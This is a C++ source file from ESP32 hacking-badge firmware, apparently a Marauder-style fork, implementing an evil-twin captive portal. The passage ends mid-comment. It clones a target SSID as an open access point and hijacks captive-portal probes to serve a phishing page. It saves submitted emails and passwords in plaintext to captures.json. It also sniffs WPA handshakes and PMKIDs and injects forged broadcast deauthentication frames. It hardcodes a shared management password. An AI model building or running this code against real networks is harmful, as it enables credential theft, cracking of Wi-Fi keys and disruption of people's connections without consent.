#include "EvilPortal.h"
#include "WiFiScan.h"      // needed for ensureBLE() in management API handlers
#include "esp_wifi.h"      // esp_wifi_stop() for the BLE heap-reclaim teardown
#include "WardriverStore.h"
#include "mbedtls/sha256.h"
#include "CommandLine.h"
#include "esp_mac.h"      // esp_efuse_mac_get_default for management identity
#include "esp_netif.h"    // AP DHCP server status check in rearmManagementAP()
#include "NfcInterface.h" // NFC read/write for management API
#include <Update.h>       // OTA firmware update via web upload
#include <ArduinoJson.h>  // E: Bug E — proper JSON body parsing

// ── Static member definitions for OutputBuffer ring buffer ──
char EvilPortal::_webOutBuf[WEB_OUTPUT_BUF_SIZE];
volatile uint16_t EvilPortal::_webOutHead = 0;  // MED-3: must match volatile in .h
volatile uint16_t EvilPortal::_webOutTail = 0;  // MED-3
portMUX_TYPE EvilPortal::_webOutLock = portMUX_INITIALIZER_UNLOCKED;  // CRIT-5 fix: initialize spinlock

WebServer server(80);

// Evil twin outcomes are recorded to SPIFFS, not only to the serial mirror.
// The mirror is a 4 KB RAM ring that /api/poll drains destructively and that a
// reboot clears, and the management AP is down for the entire attack - so the
// single message explaining why an attack failed was unreachable by the only
// person who needed it, every time. A file survives the AP disappearing, a
// reboot, and the panel not being connected, and mgmtStateJson() hands it to
// the panel on the next /api/state poll.
static String _evilNoteCache;
static bool _evilNoteLoaded = false;

// Captive-portal probe counter. This is the decisive diagnostic for "the AP
// works but no portal appears": if it stays at zero, the victim's device never
// reached us at all, which means the lease is not pointing it at our name
// server. If it climbs while the portal still refuses to open, the probe did
// arrive and the fault is in what we answered, not in being reachable. Without
// this number the two cases are indistinguishable from the outside.
static volatile uint32_t _cpProbes = 0;

static void evilNote(const String &msg) {
  Serial.println("[MGMT] " + msg);
  _evilNoteCache  = msg;
  _evilNoteLoaded = true;
  File f = SPIFFS.open("/evil_last.txt", "w");
  if (!f) return;
  f.print(msg);
  f.close();
}

// Cached deliberately: mgmtStateJson() runs on every /api/state poll, roughly
// every two seconds, and opening SPIFFS that often costs latency on the same
// loop() that services the web server for no benefit. The file is read at most
// once per boot, to recover the note written before a reset.
static String evilNoteRead() {
  if (_evilNoteLoaded) return _evilNoteCache;
  _evilNoteLoaded = true;
  if (!SPIFFS.exists("/evil_last.txt")) return _evilNoteCache;
  File f = SPIFFS.open("/evil_last.txt", "r");
  if (!f) return _evilNoteCache;
  _evilNoteCache = f.readString();
  f.close();
  _evilNoteCache.trim();
  return _evilNoteCache;
}

// Serve a SPIFFS file in bounded chunks with an explicit Content-Length and
// Connection: close. Each chunk is written with a bounded retry so a slow
// client (phone power save) cannot wedge loop() forever, and the outcome is
// logged on serial so a stalled transfer is visible.
static void mgmtServeFile(const char *path, const char *mime) {
  // BUG-01 fix: guard against heap exhaustion before serving large files
  if (esp_get_free_heap_size() < 20480) {
    server.send(503, "application/json; charset=utf-8",
      "{\"ok\":false,\"code\":\"low_memory\",\"output\":\"RAM insuficiente, reinicia el badge\"}");
    Serial.printf("[HTTP] 503 %s — heap too low (%u)\n", path, (unsigned)esp_get_free_heap_size());
    return;
  }
  // Try gzip version first — saves RAM (smaller transfer, shorter socket hold)
  String gzPath = String(path) + ".gz";
  bool isGzip = false;
  bool clientAcceptsGzip = server.header("Accept-Encoding").indexOf("gzip") >= 0;
  if (clientAcceptsGzip) {
    File f2 = SPIFFS.open(gzPath, "r");
    if (f2 && !f2.isDirectory()) {
      isGzip = true;
    } else {
      if (f2) f2.close();
    }
  }
  File f = isGzip ? SPIFFS.open(gzPath, "r") : SPIFFS.open(path, "r");
  if (!f || f.isDirectory()) {
    server.send(404, "text/plain", String(path) + " not found");
    Serial.printf("[HTTP] 404 %s\n", path);
    return;
  }
  size_t total = f.size();
  uint32_t t0 = millis();
  NetworkClient client = server.client();
  client.setNoDelay(true);

  String hdr = "HTTP/1.1 200 OK\r\nContent-Type: ";
  hdr += mime;
  hdr += "\r\nContent-Length: ";
  hdr += String((unsigned)total);
  if (isGzip) hdr += "\r\nContent-Encoding: gzip";
  hdr += "\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";
  client.write((const uint8_t *)hdr.c_str(), hdr.length());

  static uint8_t buf[1436];          // one TCP MSS, static: no heap churn
  size_t sent = 0;
  while (sent < total && client.connected()) {
    size_t n = f.read(buf, sizeof(buf));
    if (n == 0) break;
    size_t off = 0;
    uint32_t tw = millis();
    while (off < n && client.connected()) {
      size_t w = client.write(buf + off, n - off);
      if (w > 0) { off += w; tw = millis(); }
      else {
        if (millis() - tw > 3000) break;  // client stopped ACKing
        delay(2);
      }
    }
    sent += off;
    if (off < n) break;
  }
  f.close();
  client.flush();
  Serial.printf("[HTTP] %s %u/%u B in %lu ms heap=%u\n", path,
                (unsigned)sent, (unsigned)total,
                (unsigned long)(millis() - t0), (unsigned)ESP.getFreeHeap());
  client.stop();
}

char apName[MAX_AP_NAME_SIZE] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "<h1>PWNTERREY</h1>";

// Patch 4: Forward-declare the CommandLine object used by the API handler
extern CommandLine cli_obj;
// wifi_scan_obj is used by ensureBLE guards in BLE routes (declared in WiFiScan.h above)
extern WiFiScan wifi_scan_obj;

// Fixed management AP password (user directive): same on every badge so the
// SSID suffix (chip MAC) is the only per-unit variable. Printed once over
// USB at boot; never served over HTTP.
#define MGMT_AP_PASS "pwnterrey2026"

// Serial output capture is provided by SerialMirror (see SerialMirror.h):
// every Serial.print byte is mirrored into a bounded 4 KiB log ring that

// E: Bug E — replace hand-rolled JSON body parser with ArduinoJson v7.
// Falls back to form args (server.arg()) so old clients still work.
// Returns the value for `key` as a String from JSON body, or "" if not found.
// Caller owns the doc lifetime; we parse fresh per-request (handlers run in loop, stack OK).
static String mgmtBodyStr(const String& key) {
  // Fast path: check form args first (URL-encoded or multipart)
  if (server.hasArg(key)) return server.arg(key);
  if (!server.hasArg("plain") || server.arg("plain").length() == 0) return "";
  // ArduinoJson v7 parse (DynamicJsonDocument is a compat alias for JsonDocument in v7)
  JsonDocument doc;
  if (deserializeJson(doc, server.arg("plain")) != DeserializationError::Ok) return "";
  if (!doc.containsKey(key)) return "";
  JsonVariant v = doc[key];
  if (v.is<bool>())  return v.as<bool>() ? "true" : "false";
  // as<String>() handles int/float/string in ArduinoJson v7
  return v.as<String>();
}
static long mgmtBodyLong(const String& key, long def) {
  if (server.hasArg(key)) { String v = server.arg(key); return v.length() ? v.toInt() : def; }
  if (!server.hasArg("plain") || server.arg("plain").length() == 0) return def;
  JsonDocument doc;
  if (deserializeJson(doc, server.arg("plain")) != DeserializationError::Ok) return def;
  if (!doc.containsKey(key)) return def;
  return doc[key].as<long>();
}
static bool mgmtBodyBool(const String& key, bool def) {
  if (server.hasArg(key)) {
    String v = server.arg(key);
    return (v == "1" || v == "true" || v == "on");
  }
  if (!server.hasArg("plain") || server.arg("plain").length() == 0) return def;
  JsonDocument doc;
  if (deserializeJson(doc, server.arg("plain")) != DeserializationError::Ok) return def;
  if (!doc.containsKey(key)) return def;
  return doc[key].as<bool>();
}
// /api/poll drains. The previous ets_printf override was removed: it used
// vsnprintf's required-length return against a fixed 512-byte buffer and
// never captured HWCDC Serial output anyway.

EvilPortal::EvilPortal() {
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  html_files->add("Back");

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  Serial.println("[EP] Starting begin()...");
  if (!this->setAP(ssids, access_points)) {
    Serial.println("[EP] setAP failed");
    return false;
  }
  if (!this->setHtml()) {
    Serial.println("[EP] setHtml failed");
    return false;
  }
    
  Serial.println("[EP] Calling startPortal()...");
  this->startPortal(ssids, access_points);

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {

  // ── CAPTIVE PORTAL PROBES ──────────────────────────────────
  auto redirect = [this]() {
    _cpProbes++;
    server.sendHeader("Location", "/portal.html", true);
    server.send(302, "text/plain", "");
  };

  server.on("/generate_204",        [redirect](){ redirect(); }); // Android
  server.on("/hotspot-detect.html", [redirect](){ redirect(); }); // Apple
  server.on("/library/test/success.html", [redirect](){ redirect(); }); // Apple
  server.on("/ncsi.txt",            [redirect](){ redirect(); }); // Windows
  // Firefox's probe. This used to answer the literal body "success", which is
  // precisely how a client is told the network is already online - the opposite
  // of what a captive portal wants. Redirected like every other probe.
  server.on("/success.txt",         [redirect](){ redirect(); }); // Firefox
  server.on("/connecttest.txt",     [redirect](){ redirect(); }); // Windows 10+
  server.on("/canonical.html",      [redirect](){ redirect(); }); // Ubuntu/GNOME
  server.on("/chat",                [redirect](){ redirect(); }); // Apple (iOS 17+)

  // ── REDIRECT ROOT → PORTAL ────────────────────────────────
  server.on("/", [this]() {
    server.sendHeader("Location", "/portal.html", true);
    server.send(302, "text/plain", "");
  });

  // ── SERVE portal.html FROM SPIFFS ─────────────────────────
  server.on("/portal.html", HTTP_GET, [this]() {
    // Fix: Use mgmtServeFile instead of server.streamFile for reliable chunked delivery
    mgmtServeFile("/portal.html", "text/html; charset=utf-8");
  });

  // ── API: POST /api/cmd ─────────────────────────────────────
  // C3 FIX: Evil portal AP exposes this to untrusted clients — strict whitelist only.
  static const char* kEvilAllowed[] = { "list", "stopscan", "ssids", "clearlist" };
  server.on("/api/cmd", HTTP_POST, [this]() {
    // Same-origin only: no CORS wildcard headers.
    String cmd = "";
    if (server.hasArg("cmd")) {
      cmd = server.arg("cmd");
    } else if (server.hasArg("plain")) {
      cmd = server.arg("plain");  // raw body fallback
    }
    cmd.trim();

    if (cmd.length() == 0) {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"empty command\"}");
      return;
    }

    // Extract base command (before first space)
    String base = cmd;
    int sp = cmd.indexOf(' ');
    if (sp > 0) base = cmd.substring(0, sp);

    // Whitelist check — only safe read-only commands permitted from evil portal AP
    bool allowed = false;
    for (size_t i = 0; i < sizeof(kEvilAllowed) / sizeof(kEvilAllowed[0]); i++) {
      if (base == kEvilAllowed[i]) { allowed = true; break; }
    }
    if (!allowed) {
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":false,\"output\":\"command not permitted from evil portal AP\"}");
      return;
    }

    Serial.println("[API] cmd: " + cmd);

    // Drain any old output, run the command, capture new output
    SerialMirror::logDrain(); // clear stale
    cli_obj.runCommand(cmd);
    delay(80);           // let async operations write initial output
    String out = SerialMirror::logDrain();

    // Sanitise output for JSON embedding
    String json = "{\"ok\":true,\"output\":\"";
    for (int i = 0; i < (int)out.length(); i++) {
      char c = out[i];
      if (c == '"')       json += "\\\"";
      else if (c == '\\') json += "\\\\";
      else if (c == '\n') json += "\\n";
      else if (c == '\r') json += "\\r";
      else if (c >= 0x20) json += c;
    }
    json += "\"}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: GET /api/poll ─────────────────────────────────────
  server.on("/api/poll", HTTP_GET, [this]() {
    String lines = SerialMirror::logDrain();
    if (lines.length() == 0) {
      server.send(200, "application/json; charset=utf-8", "{\"lines\":[]}");
      return;
    }
    // Build JSON array of lines
    String json = "{\"lines\":[";
    bool first = true;
    int start = 0;
    for (int i = 0; i <= (int)lines.length(); i++) {
      if (i == (int)lines.length() || lines[i] == '\n') {
        String line = lines.substring(start, i);
        if (line.length() > 0) {
          if (!first) json += ",";
          json += "\"";
          for (int j = 0; j < (int)line.length(); j++) {
            char c = line[j];
            if (c == '"')       json += "\\\"";
            else if (c == '\\') json += "\\\\";
            else if (c == '\r') { /* skip */ }
            else if (c >= 0x20) json += c;
          }
          json += "\"";
          first = false;
        }
        start = i + 1;
      }
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── OPTIONS preflight: same-origin only, plain 204 ────────
  server.on("/api/cmd", HTTP_OPTIONS, [this]() {
    server.send(204, "text/plain", "");
  });

  // ── LEGACY CREDENTIAL CAPTURE (keep for compatibility) ────
  server.on("/get", [this]() {
    if (server.hasArg("email"))    { user_name = server.arg("email");    name_received = true; }
    if (server.hasArg("password")) { password  = server.arg("password"); password_received = true; }
    server.send(200, "text/html",
      "<html><body style='background:#000;color:#0f0;font-family:monospace'>"
      "<h2>Processing...</h2></body></html>");
  });

  // ── NOT FOUND → REDIRECT ──────────────────────────────────
  server.onNotFound([this]() {
    // Counted as a probe too: a device may request a detection URL we have not
    // registered, and that still proves it reached the badge.
    _cpProbes++;
    server.sendHeader("Location", "/portal.html", true);
    server.send(302, "text/plain", "");
  });

  Serial.println("[EP] Web server routes registered");
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Setting HTML from serial...");
  String htmlBuf = Serial.readString();          // C1 fix: capture before .c_str()
  const char *htmlStr = htmlBuf.c_str();
  strncpy(index_html, htmlStr, MAX_HTML_SIZE - 1);  // CRIT-1: use dest bound not src len
  index_html[MAX_HTML_SIZE - 1] = '\0';
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println("html previously set");
    return true;
  }
  Serial.println("Setting HTML...");
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    Serial.println("[EP] Could NOT find /" + this->target_html_name + ". Using default internal HTML.");
    this->has_html = true;
    return true;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given HTML is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    strncpy(index_html, html.c_str(), MAX_HTML_SIZE);
    index_html[MAX_HTML_SIZE - 1] = '\0'; // Ensure null-termination
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      Serial.println("Could not find /ap.config.txt. Using default AP name: " + (String)apName);
      ap_config = apName;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay("The given AP name is too large.");
          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from config file");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay("AP name from SSID list");
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The given AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from AP list");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println("Could not configure Access Point. Use stopscan...");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not configure Access Point.");
      this->sendToDisplay("Touch to exit...");
    #endif
  }

  if (ap_config != "") {
    // strncpy with n == sizeof(buffer) writes no terminator when the source is
    // that long or longer, and the guards above admit a name of exactly
    // MAX_AP_NAME_SIZE. apName was then read unterminated by softAP() and
    // Serial.println() below, running off the end of the buffer.
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE - 1);
    apName[MAX_AP_NAME_SIZE - 1] = '\0';
    this->has_ap = true;
    Serial.println("ap config set");
    return true;
  }
  else
    return false;

}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  #ifdef HAS_SCREEN
    this->sendToDisplay("AP started");
  #endif

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.begin();
  #ifdef HAS_SCREEN
    this->sendToDisplay("Evil Portal READY");
  #endif
}

void EvilPortal::startPortal(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  const IPAddress AP_IP(192, 168, 4, 1);
  const IPAddress AP_NET(255, 255, 255, 0);

  Serial.println("[EP] Configuring SoftAP...");

  #ifdef MARAUDER_FLIPPER_C5
    WiFi.setTxPower(WIFI_POWER_8_5dBm);
    Serial.println("[EP] TX Power reduced to 8.5dBm");
  #endif

  Serial.println("[EP] Free Heap before AP start: " + String(ESP.getFreeHeap()));

  // Robust initialization sequence: Disconnect -> Mode -> Config -> Start
  WiFi.disconnect(true);
  delay(200);

  // Using AP_STA for better dual-interface stability on C5/S3
  WiFi.mode(WIFI_AP_STA);
  Serial.println("[EP] WiFi Mode set (AP_STA). Waiting 1s for radio...");
  delay(1000); 

  // Simplified config for C5 stability (Defaulting to 192.168.4.1)
  // if (!WiFi.softAPConfig(AP_IP, AP_IP, AP_NET)) {
  //   Serial.println("[EP] ERROR: softAPConfig failed!");
  // }
  
  // Use the channel from the first target if available, default to 1
  int ep_channel = 1;
  if (ssids != nullptr && ssids->size() > 0)
    ep_channel = ssids->get(0).channel;
  
  Serial.println("[EP] Attempting WiFi.softAP on channel " + String(ep_channel) + "...");
  bool success = WiFi.softAP(apName, "", ep_channel);
  
  if (success) {
    Serial.println("[EP] SoftAP success: " + String(apName));
    Serial.println("[EP] AP IP Address: " + WiFi.softAPIP().toString());
  } else {
    Serial.println("[EP] ERROR: SoftAP failed to start.");
    return;
  }

  #ifdef MARAUDER_FLIPPER_C5
    WiFi.setTxPower(WIFI_POWER_8_5dBm);
    Serial.println("[EP] C5 TX Power stabilized at 8.5dBm");
  #endif

  // Diagnostic WiFi Events (mirror path: no heap alloc inside write())
  // MED-6: remove previous handler before registering a new one to prevent accumulation
  if (_portal_event_id != 0) {
    WiFi.removeEvent(_portal_event_id);
    _portal_event_id = 0;
  }
  _portal_event_id = WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info){
    if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
      Serial.println("[EP] CLIENT CONNECTED!");
    } else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
      Serial.println("[EP] CLIENT DISCONNECTED!");
    }
  });

  Serial.println("[EP] Starting DNS Server...");
  dnsServer.start(53, "*", WiFi.softAPIP());
  Serial.println("[EP] DNS Server up");

  // Patch 5: Mount SPIFFS so /portal.html can be served
  if (!SPIFFS.begin(true)) {
    Serial.println("[EP] WARNING: SPIFFS mount failed — portal.html will 404");
  } else {
    Serial.println("[EP] SPIFFS mounted OK");
  }

  this->setupServer();
  Serial.println("[EP] Server configured. Opening socket...");

  server.begin();
  this->runServer = true;
  this->has_ap = true;
  Serial.println("[EP] PORTAL READY AND LISTENING");
  Serial.println("[EP] Web Server started. Manual IP: 192.168.4.1");
}

String EvilPortal::getSHA256(String data) {
  unsigned char hash[32];
  mbedtls_sha256((const unsigned char*)data.c_str(), data.length(), hash, 0);
  
  String hashStr = "";
  for (int i = 0; i < 32; i++) {
    char hex[3];
    sprintf(hex, "%02x", hash[i]);
    hashStr += hex;
  }
  return hashStr;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
#ifdef HAS_SCREEN
    display_obj.display_buffer->add(display_string);
#endif
    display_obj.loading = false;
  #endif
}

// Forward declaration for JSON escaping used in capture persistence
static String mgmtJsonEscape(const String& in);

void EvilPortal::main(uint8_t scan_mode) {
  // Heartbeat disabled to prevent CDC saturation on C5
  // (was printing every 1s, causing write timeouts on USB serial)

  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
    this->dnsServer.processNextRequest();
    
    // Channel hop during handshake capture
    static uint32_t lastHsHop = 0;
    static uint8_t hsCh = 1;
    if (hs_active) {
      uint32_t now = millis();
      if (now - lastHsHop > 250) {  // hop every 250ms
        lastHsHop = now;
        hsCh = (hsCh % 13) + 1;
        esp_wifi_set_channel(hsCh, WIFI_SECOND_CHAN_NONE);
      }
    }
    
    server.handleClient();
    
    this->flushCapturedCreds();
  }
}

// Hash and persist a completed credential pair. Lifted out of main() so that
// mainManagement() can run it too. main() is commented out of the sketch's
// loop() on this build, so nothing ever consumed name_received /
// password_received: every credential a victim submitted was accepted by the
// web handler, held in RAM, and then silently dropped.
void EvilPortal::flushCapturedCreds() {
  if (!(this->name_received && this->password_received)) return;
  this->name_received = false;
  this->password_received = false;

  String hashed_user = this->getSHA256(this->user_name);
  String hashed_pass = this->getSHA256(this->password);

  String logValue1 = "u: " + hashed_user;
  String logValue2 = "p: " + hashed_pass;
  String full_string = logValue1 + " " + logValue2 + "\n";

  Serial.println("[EP] RECORDING HASHED CREDENTIALS...");
  Serial.print(full_string);
  buffer_obj.append(full_string);

  // Save to SPIFFS for persistence across resets
  {
    // MED-5: enforce 8KB cap on captures.json to prevent SPIFFS exhaustion
    static const size_t CAPTURES_MAX = 8192;
    String existing = "";
    if (SPIFFS.exists("/captures.json")) {
      File rf = SPIFFS.open("/captures.json", "r");
      existing = rf.readString();
      rf.close();
    }
    // Build simple JSON array
    if (existing.length() < 5) existing = "{\"captures\":[]}";
    // Insert new entry before closing ]}
    int pos = existing.lastIndexOf("]}");
    if (pos > 0) {
      String entry = "{\"user\":\"" + mgmtJsonEscape(this->user_name) +
                     "\",\"pass\":\"" + mgmtJsonEscape(this->password) +
                     "\",\"user_h\":\"" + hashed_user +
                     "\",\"pass_h\":\"" + hashed_pass +
                     "\",\"ap\":\"" + String(apName) +
                     "\",\"t\":" + String(millis()/1000) + "}";
      bool hasEntries = existing.indexOf("[{") > 0;
      String updated = existing.substring(0, pos) +
                      (hasEntries ? "," : "") + entry + "]}";
      if (updated.length() > CAPTURES_MAX) {
        Serial.println("[EP] WARN: captures.json would exceed 8KB cap, skipping save");
      } else {
        File wf = SPIFFS.open("/captures.json", "w");
        if (!wf) {
          Serial.println("[EP] ERROR: cannot open captures.json for write");
        } else {
          size_t written = wf.print(updated);
          wf.close();
          if (written == 0) Serial.println("[EP] ERROR: captures.json write failed");
          else Serial.println("[EP] Capture saved to SPIFFS (" + String(updated.length()) + "B)");
        }
      }
    }
  }

  #ifdef HAS_SCREEN
    this->sendToDisplay("Data Hashed & Saved");
  #endif
}

// ── PASSIVE HANDSHAKE CAPTURE (static storage) ────────────────
EvilPortal::hs_entry_t EvilPortal::hs_list[MAX_HS_ENTRIES];
uint8_t EvilPortal::hs_count = 0;
bool EvilPortal::hs_active = false;
bool EvilPortal::hs_deauth = false;

int EvilPortal::hsFindOrAdd(const uint8_t* bssid) {
  for (int i = 0; i < hs_count; i++) {
    if (memcmp(hs_list[i].bssid, bssid, 6) == 0) return i;
  }
  if (hs_count >= MAX_HS_ENTRIES) return -1;
  memcpy(hs_list[hs_count].bssid, bssid, 6);
  hs_list[hs_count].ssid[0] = '\0';
  hs_list[hs_count].eapol_msgs = 0;
  hs_list[hs_count].has_pmkid = false;
  hs_list[hs_count].rssi = -100;
  hs_list[hs_count].ch = 0;
  return hs_count++;
}

void IRAM_ATTR EvilPortal::hsSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 36) return;

  uint8_t frame_type = payload[0];

  // Beacon frame (0x80) — extract SSID for display
  if (frame_type == 0x80 && len > 38) {
    const uint8_t* bssid = &payload[10];
    int idx = hsFindOrAdd(bssid);
    if (idx >= 0 && hs_list[idx].ssid[0] == '\0') {
      // SSID is in tagged params starting at byte 36
      if (payload[36] == 0x00 && payload[37] > 0 && payload[37] < 33) {
        int ssid_len = payload[37];
        memcpy(hs_list[idx].ssid, &payload[38], ssid_len);
        hs_list[idx].ssid[ssid_len] = '\0';
      }
      hs_list[idx].rssi = pkt->rx_ctrl.rssi;
      hs_list[idx].ch = pkt->rx_ctrl.channel;
    }

    // Send deauth if enabled
    if (hs_deauth) {
      extern WiFiScan wifi_scan_obj;
      uint8_t deauth[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src = AP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid = AP
        0x00, 0x00,                           // seq
        0x07, 0x00                            // reason: class 3
      };
      memcpy(&deauth[10], bssid, 6);
      memcpy(&deauth[16], bssid, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
    }
    return;
  }

  // EAPOL frame detection: check for 0x888e at offset 30 or 32
  bool is_eapol = false;
  int eapol_off = 0;
  if (len > 34 && payload[30] == 0x88 && payload[31] == 0x8e) {
    is_eapol = true; eapol_off = 32;
  } else if (len > 36 && payload[32] == 0x88 && payload[33] == 0x8e) {
    is_eapol = true; eapol_off = 34;
  }

  if (is_eapol) {
    // BSSID is at offset 10 (addr1=dst) or 16 (addr3=bssid)
    const uint8_t* bssid = &payload[16];
    int idx = hsFindOrAdd(bssid);
    if (idx < 0) return;

    hs_list[idx].rssi = pkt->rx_ctrl.rssi;
    hs_list[idx].ch = pkt->rx_ctrl.channel;

    // Determine EAPOL message number from key info field
    if (len > eapol_off + 6) {
      uint16_t key_info = (payload[eapol_off + 5] << 8) | payload[eapol_off + 6];
      bool pairwise = key_info & 0x0008;
      bool ack = key_info & 0x0080;
      bool mic = key_info & 0x0100;
      bool secure = key_info & 0x0200;

      if (pairwise && ack && !mic)       hs_list[idx].eapol_msgs |= 0x01; // M1
      else if (pairwise && !ack && mic && !secure) hs_list[idx].eapol_msgs |= 0x02; // M2
      else if (pairwise && ack && mic && secure)   hs_list[idx].eapol_msgs |= 0x04; // M3
      else if (pairwise && !ack && mic && secure)  hs_list[idx].eapol_msgs |= 0x08; // M4

      // Check for PMKID in M1 (key data after offset eapol_off+99 if len allows)
      if ((hs_list[idx].eapol_msgs & 0x01) && len > eapol_off + 103) {
        // PMKID tag type is 0x0014 in RSN PMKID list
        for (int i = eapol_off + 99; i < len - 20; i++) {
          if (payload[i] == 0x00 && payload[i+1] == 0x14 &&
              payload[i+2] == 0x00 && payload[i+3] == 0x01) {
            hs_list[idx].has_pmkid = true;
            break;
          }
        }
      }
    }

    // Log to serial
    char mac[18];
    snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    Serial.printf("[HS] %s msgs=0x%02X pmkid=%d\n",
                  mac, hs_list[idx].eapol_msgs, hs_list[idx].has_pmkid);
  }
}

// ── MANAGEMENT OPERATOR-CONTROL MODE ──────────────────────────
// Boot-time operator AP. No DNS wildcard, no captive portal probes,
// no /get credential route; /api/cmd is restricted to a whitelist.

// Exact base commands allowed from the management web UI
static const char* kMgmtAllowed[] = {
  "help", "info", "settings", "channel", "gpsdata", "gps", "list", "nfc",
  "spiffs", "scanap", "scansta", "sigmon", "wardrive", "btwardrive", "stopscan"  // BUG-05 fix
};
// Risky WiFi commands: executing them can drop the control connection,
